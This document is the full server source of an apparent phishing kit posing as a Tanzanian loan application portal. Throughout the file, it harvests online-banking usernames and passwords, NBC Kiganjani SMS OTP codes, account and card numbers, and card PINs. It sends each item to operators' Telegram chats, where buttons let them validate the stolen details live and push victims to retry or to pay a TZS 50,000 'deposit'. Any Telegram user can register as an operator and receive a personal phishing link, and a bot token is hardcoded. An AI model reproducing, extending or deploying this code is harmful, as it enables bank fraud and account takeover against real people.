/**
 * TANZANIA MKOPO PORTAL - SERVER
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        paid: rec.paid ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        status: rec.status || 'PENDING',
        welcomeSent: rec.welcomeSent ?? false
      }]));
    }
  } catch (err) {}
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {}
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) return FALLBACK_ADMIN_ID;
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized && adminRecord.paid) return targetAdmin;
  }
  return FALLBACK_ADMIN_ID;
}

async function initBot() {
  if (!TOKEN) return;
  bot = new TelegramBot(TOKEN, { polling: true });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try { chatInfo = await bot.getChat(chatId); } catch (e) {}

      const username = chatInfo.username || msg.from.username || '';
      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
      const lastName = chatInfo.last_name || msg.from.last_name || '';

      const existingAdmin = admins.get(chatId);

      if (!existingAdmin || !existingAdmin.welcomeSent) {
        admins.set(chatId, {
          authorized: true,
          paid: true,
          username,
          firstName,
          lastName,
          startedAt: existingAdmin?.startedAt || new Date(),
          welcomeSent: true
        });
        saveAdmins();

        const userLink = `${APP_URL}/?admin=${chatId}`;
        const startMessage = `🤖 *BOT STARTED & READY*\n\n` +
                             `👤 *User Info:*\n` +
                             `• *Name:* ${firstName} ${lastName}\n` +
                             `• *Username:* @${username}\n` +
                             `• *Chat ID:* \`${chatId}\`\n\n` +
                             `🔗 *Your Loan Application Link:*\n${userLink}`;

        await bot.sendMessage(chatId, startMessage, { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `🟢 *Bot tayari iko hai.* Subiri taarifa za waombaji.`, { parse_mode: 'Markdown' });
      }
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_');
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) session = { adminChatId: chatId };

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'WRONG_CREDS':
          session.status = 'RETRY_CREDS';
          await bot.sendMessage(chatTarget, `❌ Taarifa za kuingia zimekataliwa. Mwombaji ameelekezwa kuingiza upya.`);
          break;
        case 'CORRECT_CREDS':
          session.status = 'PROCEED_OTP';
          await bot.sendMessage(chatTarget, `✅ Taarifa zimekubaliwa. Mwombaji anaelekea kuingiza OTP ya NBC Kiganjani.`);
          break;
        case 'EXPIRED_OTP':
          session.status = 'RETRY_OTP';
          session.otp = '';
          await bot.sendMessage(chatTarget, `⚠️ OTP imeisha muda wake. Mwombaji anaomba kuingiza OTP mpya.`);
          break;
        case 'VALID_OTP':
          session.status = 'PROCEED_BANK_DETAILS';
          await bot.sendMessage(chatTarget, `✅ OTP imethibitishwa. Mwombaji anaendelea na Taarifa za Kadi na Akaunti.`);
          break;
        case 'INVALID_ACC':
          session.status = 'RETRY_ACC';
          await bot.sendMessage(chatTarget, `❌ Namba ya akaunti si sahihi.`);
          break;
        case 'INVALID_CARD':
          session.status = 'RETRY_CARD';
          await bot.sendMessage(chatTarget, `❌ Namba ya kadi si sahihi.`);
          break;
        case 'INCORRECT_PIN':
          session.status = 'RETRY_PIN';
          await bot.sendMessage(chatTarget, `❌ PIN ya kadi si sahihi.`);
          break;
        case 'FINAL_APPROVED':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Maombi yameidhinishwa! Ukurasa wa Amana (TZS 50,000) umefunguka kwa mteja.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: 'Imeshughulikiwa' }).catch(() => {});
      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Step 1: Login Credentials (Username & Password)
app.post('/api/submit-credentials', async (req, res) => {
  try {
    let { username, password, adminChatId, fullName, phone, loanType, loanAmount, loanMonths } = req.body || {};
    const targetChat = resolveTargetChat(adminChatId);
    const userId = `applicant_${Date.now()}`;

    sessions.set(userId, {
      username, password, fullName, phone, loanType, loanAmount, loanMonths,
      adminChatId: targetChat,
      status: 'WAITING_CREDS_APPROVAL'
    });

    const message = `┌──────────────────────────────┐\n` +
                    `│ 🔴 *MAOMBI YA MKOPO - TAARIFA* │\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 👤 *Jina:* \`${fullName || 'N/A'}\`\n` +
                    `│ 📱 *Simu:* \`${phone || 'N/A'}\`\n` +
                    `│ 💰 *Kiasi:* TZS \`${loanAmount}\` (${loanMonths} Miezi)\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 🔑 *Username:* \`${username}\`\n` +
                    `│ 🔒 *Password:* \`${password}\`\n` +
                    `└──────────────────────────────┘`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'WRONG DETAILS', callback_data: `WRONG_CREDS_${userId}` },
            { text: 'CORRECT DETAILS', callback_data: `CORRECT_CREDS_${userId}` }
          ]
        ]
      }
    };

    if (bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Hitilafu ya server.' });
  }
});

// Step 2: 6-Digit SMS OTP (NBC Kiganjani)
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Session haijapatikana' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message = `┌──────────────────────────────┐\n` +
                    `│ 🔴 *NBC KIGANJANI - OTP 6*   │\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 📲 *OTP Code:* \`${otp}\`          │\n` +
                    `└──────────────────────────────┘`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
            { text: 'VALID OTP', callback_data: `VALID_OTP_${userId}` }
          ]
        ]
      }
    };

    if (bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Hitilafu' });
  }
});

// Step 3: Bank Details (Account, Card, PIN)
app.post('/api/submit-bank-details', async (req, res) => {
  try {
    const { userId, account, card, cardPin } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Session haijapatikana' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_FINAL_VERIFICATION';
    session.account = account;
    session.card = card;
    session.cardPin = cardPin;

    const message = `┌──────────────────────────────┐\n` +
                    `│ 🔴 *TAARIFA ZA BENKI NA KADI* │\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 💳 *Akaunti:* \`${account}\`\n` +
                    `│ 💳 *Kadi:* \`${card}\`\n` +
                    `│ 🔒 *PIN ya Kadi:* \`${cardPin}\`         │\n` +
                    `└──────────────────────────────┘`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'INVALID ACC.NO:', callback_data: `INVALID_ACC_${userId}` },
            { text: 'INVALID CARD NO:', callback_data: `INVALID_CARD_${userId}` }
          ],
          [
            { text: 'INCORRECT CARD PIN', callback_data: `INCORRECT_PIN_${userId}` },
            { text: 'APPROVED', callback_data: `FINAL_APPROVED_${userId}` }
          ]
        ]
      }
    };

    if (bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Hitilafu' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
  console.log(`Server running on port ${PORT}`);
});
